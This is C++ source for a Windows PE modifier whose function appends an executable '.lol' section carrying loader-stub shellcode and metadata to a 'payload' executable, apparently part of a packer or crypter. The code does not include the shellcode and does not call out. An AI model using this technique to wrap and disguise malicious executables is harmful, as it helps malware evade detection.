#include "pe_modifier.hpp"
#include <Windows.h>
#include "main.hpp"
#include "common.hpp"
#include "loader_stub_config.hpp"

DWORD Align(DWORD value, DWORD alignment) {
    return (value + alignment - 1) & ~(alignment - 1);
}

BYTE* AddLoaderSectionToPE(BYTE* pOriginalPayloadBuffer, DWORD* pOriginalInputFileSize, const LoaderMetadata* pLoaderData, DWORD* outLoaderRva) {
    if (!pOriginalPayloadBuffer || !pOriginalInputFileSize || !pLoaderData || !outLoaderRva) {
        logf("[-] AddLoaderSectionToPE: Invalid arguments\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS_CURRENT pNtHeadersOriginal = GetNtHeadersFromBuffer(pOriginalPayloadBuffer);
    if (!pNtHeadersOriginal) {
        logf("[-] AddLoaderSectionToPE: Could not get NT headers from original payload buffer\n");
        return NULL;
    }

    WORD originalNumberOfSections = pNtHeadersOriginal->FileHeader.NumberOfSections;
    DWORD fileAlignment = pNtHeadersOriginal->OptionalHeader.FileAlignment;
    DWORD sectionAlignment = pNtHeadersOriginal->OptionalHeader.SectionAlignment;
    DWORD originalSizeOfHeadersFromOpt = pNtHeadersOriginal->OptionalHeader.SizeOfHeaders;
    DWORD currentActualInputFileSize = *pOriginalInputFileSize;

    DWORD newSectionContentSize = g_loaderStubShellcodeSize + sizeof(LoaderMetadata);
    BYTE* pNewSectionContent = (BYTE*)malloc(newSectionContentSize);
    if (!pNewSectionContent) {
        logf("[-] AddLoaderSectionToPE: Failed to allocate memory for new section content\n");
        return NULL;
    }
    memcpy(pNewSectionContent, g_loaderStubShellcode, g_loaderStubShellcodeSize);
    memcpy(pNewSectionContent + g_loaderStubShellcodeSize, pLoaderData, sizeof(LoaderMetadata));

    IMAGE_SECTION_HEADER newSectionHeaderStruct;
    memset(&newSectionHeaderStruct, 0, sizeof(IMAGE_SECTION_HEADER));
    strcpy_s((char*)newSectionHeaderStruct.Name, IMAGE_SIZEOF_SHORT_NAME, ".lol");
    newSectionHeaderStruct.Misc.VirtualSize = newSectionContentSize;
    newSectionHeaderStruct.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    DWORD maxExistingVirtualExtent = 0;
    if (originalNumberOfSections > 0) {
        PIMAGE_SECTION_HEADER pSectionWalker = IMAGE_FIRST_SECTION(pNtHeadersOriginal);
        for (WORD i = 0; i < originalNumberOfSections; ++i) {
            if (pSectionWalker->VirtualAddress + pSectionWalker->Misc.VirtualSize > maxExistingVirtualExtent) {
                maxExistingVirtualExtent = pSectionWalker->VirtualAddress + pSectionWalker->Misc.VirtualSize;
            }
            pSectionWalker++;
        }
    }
    else {
        maxExistingVirtualExtent = originalSizeOfHeadersFromOpt;
    }
    if (maxExistingVirtualExtent == 0) maxExistingVirtualExtent = (sectionAlignment > 0 ? sectionAlignment : 0x1000);
    newSectionHeaderStruct.VirtualAddress = Align(maxExistingVirtualExtent, sectionAlignment);
    *outLoaderRva = newSectionHeaderStruct.VirtualAddress;

    DWORD offsetOfOriginalSectionTableStart = (DWORD)((BYTE*)IMAGE_FIRST_SECTION(pNtHeadersOriginal) - pOriginalPayloadBuffer);
    DWORD rawOffsetAfterOriginalTable = offsetOfOriginalSectionTableStart + (originalNumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    DWORD endOfEnlargedSectionTableRaw = rawOffsetAfterOriginalTable + sizeof(IMAGE_SECTION_HEADER);
    DWORD requiredFinalSizeOfHeaders = Align(endOfEnlargedSectionTableRaw, fileAlignment);

    bool isShiftingNeeded = false;
    DWORD shiftAmount = 0;
    DWORD originalFirstSectionActualRawOffset = 0;

    if (originalNumberOfSections > 0) {
        originalFirstSectionActualRawOffset = (IMAGE_FIRST_SECTION(pNtHeadersOriginal))->PointerToRawData;
        if (requiredFinalSizeOfHeaders > originalSizeOfHeadersFromOpt && requiredFinalSizeOfHeaders > originalFirstSectionActualRawOffset) {
            if (originalFirstSectionActualRawOffset != 0 && originalFirstSectionActualRawOffset < originalSizeOfHeadersFromOpt) {
                logf("[-] AddLoaderSectionToPE: Error! Original PE first section raw data (0x%X) within original SizeOfHeaders (0x%X).\n",
                    originalFirstSectionActualRawOffset, originalSizeOfHeadersFromOpt);
                free(pNewSectionContent); return NULL;
            }
            isShiftingNeeded = true;
            shiftAmount = requiredFinalSizeOfHeaders - originalSizeOfHeadersFromOpt;
        }
    }
    if (!isShiftingNeeded) shiftAmount = 0;

    newSectionHeaderStruct.SizeOfRawData = Align(newSectionContentSize, fileAlignment);
    DWORD endOfOldContentPlusShift = currentActualInputFileSize + shiftAmount;
    newSectionHeaderStruct.PointerToRawData = Align(endOfOldContentPlusShift, fileAlignment);
    DWORD newTotalFileSize = newSectionHeaderStruct.PointerToRawData + newSectionHeaderStruct.SizeOfRawData;

    BYTE* pModifiedPayloadBuffer = (BYTE*)malloc(newTotalFileSize);
    if (!pModifiedPayloadBuffer) {
        logf("[-] AddLoaderSectionToPE: Failed to allocate for modified payload (size %u)\n", newTotalFileSize);
        free(pNewSectionContent); return NULL;
    }
    memset(pModifiedPayloadBuffer, 0, newTotalFileSize);

    DWORD ntHeadersOriginalFileOffset = (DWORD)((BYTE*)pNtHeadersOriginal - pOriginalPayloadBuffer);
    memcpy(pModifiedPayloadBuffer, pOriginalPayloadBuffer, ntHeadersOriginalFileOffset);

    PIMAGE_NT_HEADERS_CURRENT pNtHeadersModified = (PIMAGE_NT_HEADERS_CURRENT)(pModifiedPayloadBuffer + ntHeadersOriginalFileOffset);
    memcpy(pNtHeadersModified, pNtHeadersOriginal,
        sizeof(IMAGE_NT_SIGNATURE) + sizeof(IMAGE_FILE_HEADER) + pNtHeadersOriginal->FileHeader.SizeOfOptionalHeader);

    pNtHeadersModified->OptionalHeader.SizeOfHeaders = requiredFinalSizeOfHeaders;

    PIMAGE_SECTION_HEADER pDestSectionTableStart = IMAGE_FIRST_SECTION(pNtHeadersModified);
    PIMAGE_SECTION_HEADER pSrcSectionTableStart = IMAGE_FIRST_SECTION(pNtHeadersOriginal);
    if (originalNumberOfSections > 0) {
        memcpy(pDestSectionTableStart, pSrcSectionTableStart, originalNumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    }

    if (isShiftingNeeded && originalNumberOfSections > 0) {
        PIMAGE_SECTION_HEADER pModSectionWalker = pDestSectionTableStart;
        for (WORD i = 0; i < originalNumberOfSections; ++i) {
            if (pModSectionWalker->PointerToRawData != 0 && pModSectionWalker->SizeOfRawData != 0) {
                pModSectionWalker->PointerToRawData += shiftAmount;
            }
            pModSectionWalker++;
        }
    }

    PIMAGE_SECTION_HEADER pNewHeaderSlotInModified = pDestSectionTableStart + originalNumberOfSections;
    memcpy(pNewHeaderSlotInModified, &newSectionHeaderStruct, sizeof(IMAGE_SECTION_HEADER));

    PIMAGE_SECTION_HEADER pOrigSecWalker = pSrcSectionTableStart;
    PIMAGE_SECTION_HEADER pModSecWalker = pDestSectionTableStart;
    for (WORD i = 0; i < originalNumberOfSections; ++i) {
        if (pOrigSecWalker->SizeOfRawData > 0 && pOrigSecWalker->PointerToRawData > 0) {
            DWORD srcOffset = pOrigSecWalker->PointerToRawData;
            DWORD destOffset = pModSecWalker->PointerToRawData;
            DWORD sizeToCopy = pOrigSecWalker->SizeOfRawData;

            if (srcOffset + sizeToCopy > currentActualInputFileSize) {
                logf("[-] AddLoaderSectionToPE: Section '%.8s' source read out of bounds.\n", (char*)pOrigSecWalker->Name);
                free(pNewSectionContent); free(pModifiedPayloadBuffer); return NULL;
            }
            if (destOffset + sizeToCopy > newTotalFileSize) {
                logf("[-] AddLoaderSectionToPE: Section '%.8s' destination write out of bounds.\n", (char*)pModSecWalker->Name);
                free(pNewSectionContent); free(pModifiedPayloadBuffer); return NULL;
            }
            memcpy(pModifiedPayloadBuffer + destOffset, pOriginalPayloadBuffer + srcOffset, sizeToCopy);
        }
        pOrigSecWalker++;
        pModSecWalker++;
    }

    if (newSectionHeaderStruct.PointerToRawData + newSectionContentSize > newTotalFileSize) {
        logf("[-] AddLoaderSectionToPE: New section content write out of bounds (PtrRawData 0x%X, ContentSize %u, TotalFile %u)\n",
            newSectionHeaderStruct.PointerToRawData, newSectionContentSize, newTotalFileSize);
        free(pNewSectionContent); free(pModifiedPayloadBuffer); return NULL;
    }
    memcpy(pModifiedPayloadBuffer + newSectionHeaderStruct.PointerToRawData, pNewSectionContent, newSectionContentSize);
    free(pNewSectionContent);

    pNtHeadersModified->FileHeader.NumberOfSections = originalNumberOfSections + 1;

    DWORD maxFinalVaExtent = 0;
    PIMAGE_SECTION_HEADER finalSecWalker = IMAGE_FIRST_SECTION(pNtHeadersModified);
    for (WORD i = 0; i < pNtHeadersModified->FileHeader.NumberOfSections; ++i) {
        DWORD currentSectionEndVa = finalSecWalker->VirtualAddress + finalSecWalker->Misc.VirtualSize;
        if (currentSectionEndVa > maxFinalVaExtent) {
            maxFinalVaExtent = currentSectionEndVa;
        }
        finalSecWalker++;
    }
    if (maxFinalVaExtent == 0 && pNtHeadersModified->FileHeader.NumberOfSections == 0) {
        maxFinalVaExtent = pNtHeadersModified->OptionalHeader.SizeOfHeaders;
    }
    else if (maxFinalVaExtent == 0) {
        maxFinalVaExtent = pNtHeadersModified->OptionalHeader.SizeOfHeaders;
    }

    pNtHeadersModified->OptionalHeader.SizeOfImage = Align(maxFinalVaExtent, sectionAlignment);

    *pOriginalInputFileSize = newTotalFileSize;

    logf("[+] AddLoaderSectionToPE: Successfully processed. Shifted: %s. Final Sections:%u, SoH:0x%X, SoI:0x%X, FileSize:%u\n",
        isShiftingNeeded ? "Yes" : "No",
        pNtHeadersModified->FileHeader.NumberOfSections,
        pNtHeadersModified->OptionalHeader.SizeOfHeaders,
        pNtHeadersModified->OptionalHeader.SizeOfImage,
        newTotalFileSize);

    return pModifiedPayloadBuffer;
}